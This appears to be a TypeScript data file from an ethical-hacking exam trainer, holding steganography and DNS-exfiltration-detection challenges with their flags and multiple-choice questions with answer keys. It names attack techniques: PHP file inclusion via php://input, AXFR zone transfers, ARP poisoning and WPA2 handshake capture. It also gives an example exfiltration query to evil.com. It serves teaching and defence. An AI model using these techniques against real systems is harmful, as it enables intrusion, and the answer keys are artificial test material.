    correctFlag: 'flag_vault.txt',
    solutionBreakdown: [
      'Launch OpenStego GUI or run command line CLI wrapper.',
      'Provide stego file `logo.bmp` and passphrase `keybit2026`.',
      'The extracted artifact filename is `flag_vault.txt`.'
    ],
    codeSnippetExample: 'openstego --extract -sf logo.bmp -p keybit2026'
  },
  {
    id: 19,
    title: 'Challenge 19: SNOW Whitespace Steganography',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'A text file `notes.txt` contains invisible spaces and tabs at the ends of lines. Decode using SNOW.',
    targetInfo: 'File: ~/Desktop/notes.txt (Passphrase: "cehpass")',
    task: 'What message was concealed in the whitespace?',
    flagHint: 'Run `snow -C -p "cehpass" notes.txt output.txt` and check output.txt.',
    correctFlag: 'EXAM_PASSED_2026',
    solutionBreakdown: [
      'Run: `snow -C -p "cehpass" notes.txt secret.txt`.',
      'Inspect output: `cat secret.txt`.',
      'Message is `EXAM_PASSED_2026`.'
    ],
    codeSnippetExample: 'snow -C -p "cehpass" notes.txt output.txt && cat output.txt'
  },
  {
    id: 20,
    title: 'Challenge 20: Wireshark DNS Exfiltration Detection',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'Malware is exfiltrating base64 data inside DNS query subdomains (e.g., `dGVzdA==.evil.com`). Inspect `dns_exfil.pcap`.',
    targetInfo: 'File: ~/Desktop/dns_exfil.pcap',
    task: 'Decode the base64 string concatenated from the DNS query prefixes.',
    flagHint: 'Extract query names with `tshark -r dns_exfil.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name`.',
    correctFlag: 'ROOT_COMPROMISE_CONFIRMED',
    solutionBreakdown: [
      'Extract subdomains: `tshark -r dns_exfil.pcap -T fields -e dns.qry.name | cut -d. -f1`.',
      'Base64 string is `Uk9PVF9DT01QUk9NSVNFX0NPTkZJUk1FRA==`.',
      'Decode: `echo "Uk9PVF9DT01QUk9NSVNFX0NPTkZJUk1FRA==" | base64 -d`.',
      'Result: `ROOT_COMPROMISE_CONFIRMED`.'
    ],
    codeSnippetExample: 'echo "Uk9PVF9DT01QUk9NSVNFX0NPTkZJUk1FRA==" | base64 -d'
  }
];

export const WRITTEN_PRACTICE_QUESTIONS: WrittenQuizQuestion[] = [
  {
    id: 1,
    domain: 'Domain 1: Information Security & Ethical Hacking Overview',
    question: 'Under US federal law (CFAA 18 U.S.C. § 1030), what distinguishes ethical penetration testing from unlawful computer tampering?',
    options: [
      'The ethical hacker only uses open-source tools like Nmap and Wireshark.',
      'Formal, written authorization and explicit Rules of Engagement (RoE) signed by the asset owner prior to testing.',
      'Testing only during off-peak business hours to prevent disruption.',
      'Refraining from downloading customer database tables.'
    ],
    correctIndex: 1,
    explanation: 'Written consent and a clearly defined Rules of Engagement (RoE) document protect the security tester from civil and criminal liability under computer crime statutes.'
  },
  {
    id: 2,
    domain: 'Domain 2: Reconnaissance & Footprinting',
    question: 'Which DNS query type should a penetration tester send to request a full zone transfer (AXFR) from a misconfigured primary DNS nameserver?',
    options: [
      'dig @ns1.target.com target.com -t ANY',
      'dig axfr @ns1.target.com target.com',
      'nslookup -type=ptr 192.168.1.1 ns1.target.com',
      'host -t soa target.com'
    ],
    correctIndex: 1,
    explanation: 'AXFR is the DNS zone transfer query protocol over TCP port 53. If not restricted to authorized secondary DNS servers, it dumps all hostnames, mail exchangers, and IP addresses.'
  },
  {
    id: 3,
    domain: 'Domain 3: Scanning Networks',
    question: 'In an Nmap TCP SYN Stealth scan (-sS), what packet does the attacker machine send immediately after receiving a SYN/ACK from an open port on the target?',
    options: [
      'ACK packet to finalize the 3-way handshake',
      'FIN packet to gracefully close the connection',
      'RST (Reset) packet to tear down the connection before it is established in the OS socket backlog',
      'URG packet to initiate data transfer'
    ],
    correctIndex: 2,
    explanation: 'The TCP SYN scan is called "half-open" because the attacker sends a RST immediately upon receiving SYN/ACK, never completing the 3-way handshake, preventing application-layer logging.'
  },
  {
    id: 4,
    domain: 'Domain 4: Enumeration',
    question: 'When enumerating an active Windows Active Directory Domain Controller, which TCP port handles Kerberos ticket authentication requests?',
    options: [
      'Port 88',
      'Port 389',
      'Port 445',
      'Port 3268'
    ],
    correctIndex: 0,
    explanation: 'Port 88 is Kerberos (AS-REQ / TGS-REQ). Port 389 is LDAP, Port 445 is SMB, and Port 3268 is the Global Catalog.'
  },
  {
    id: 5,
    domain: 'Domain 5: Vulnerability Analysis',
    question: 'In CVSS v3.1 scoring, what does a vector starting with "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" indicate regarding Attack Vector (AV) and Privileges Required (PR)?',
    options: [
      'Local attack vector (AV:L), high privileges required (PR:H)',
      'Network attack vector (AV:N), no privileges required (PR:N)',
      'Physical vector (AV:P), user interaction required (UI:R)',
      'Adjacent network vector (AV:A), low privileges required (PR:L)'
    ],
    correctIndex: 1,
    explanation: 'AV:N = Network (remotely exploitable); PR:N = Privileges Required is None; AC:L = Low complexity; C:H/I:H/A:H = High impact across Confidentiality, Integrity, and Availability. This produces a Critical 9.8 score.'
  },
  {
    id: 6,
    domain: 'Domain 6: System Hacking',
    question: 'Consider the following vulnerable PHP snippet:\n\n```php\n$user_input = $_GET["file"];\ninclude("templates/" . $user_input);\n```\n\nHow can an attacker exploit this input sanitization failure to execute arbitrary code?',
    options: [
      'Passing ?file=index.html',
      'Using php://input wrapper or data://text/plain;base64,... to inject PHP code via Local/Remote File Inclusion',
      'Submitting an oversized cookie to cause integer overflow',
      'Triggering a cross-site request forgery token renewal'
    ],
    correctIndex: 1,
    explanation: 'The `include()` function executes whatever PHP tokens exist in the targeted file or stream. PHP wrappers like php://filter or php://input allow arbitrary code execution when allow_url_include is enabled.'
  },
  {
    id: 7,
    domain: 'Domain 7: Malware Threats',
    question: 'What is the fundamental difference between a computer virus and a computer worm?',
    options: [
      'A virus requires human interaction (e.g. executing a host file) to replicate, whereas a worm replicates autonomously across networks without human intervention.',
      'A virus only targets Windows, while worms target Linux.',
      'A worm encrypts files for ransom, whereas viruses only display adware.',
      'A virus modifies BIOS firmware, while worms reside only in RAM.'
    ],
    correctIndex: 0,
    explanation: 'Viruses attach to executable host files and require execution by a user. Worms self-replicate across network protocols (e.g., exploiting MS17-010 EternalBlue) without host files or user actions.'
  },
  {
    id: 8,
    domain: 'Domain 8: Sniffing & Network Attacks',
    question: 'How does ARP Poisoning (Gratuitous ARP spoofing) allow an attacker on a switched local network to intercept traffic between a victim host and the default gateway?',
    options: [
      'By changing the IP address of the gateway router',
      'By poisoning the local DNS resolver cache on the root nameserver',
      'By sending unsolicited ARP replies mapping the gateway IP address to the attacker machine MAC address',
      'By disabling the CAM table on the layer-2 switch'
    ],
    correctIndex: 2,
    explanation: 'ARP is stateless and lacks authentication. Devices accept Gratuitous ARP replies, overwriting their ARP cache so frames intended for the gateway IP are delivered to the attacker MAC address.'
  },
  {
    id: 9,
    domain: 'Domain 9: Cryptography & Wireless',
    question: 'In the WPA2 4-Way Handshake, which packet exchange can be captured by an attacker (using airodump-ng and aireplay-ng deauth) to perform an offline dictionary attack against the Pre-Shared Key (PSK)?',
    options: [
      'The WEP IV initialization vectors',
      'Message 1 and Message 2 containing the ANonce, SNonce, and MIC (Message Integrity Code)',
      'The beacon frame SSID broadcast',
      'The DHCP discovery broadcast'
    ],
    correctIndex: 1,
    explanation: 'The attacker captures the 4-way handshake containing the Access Point Nonce (ANonce), Client Nonce (SNonce), and MIC. An offline dictionary attack tests candidate passwords through PBKDF2 to match the MIC.'
  }
];
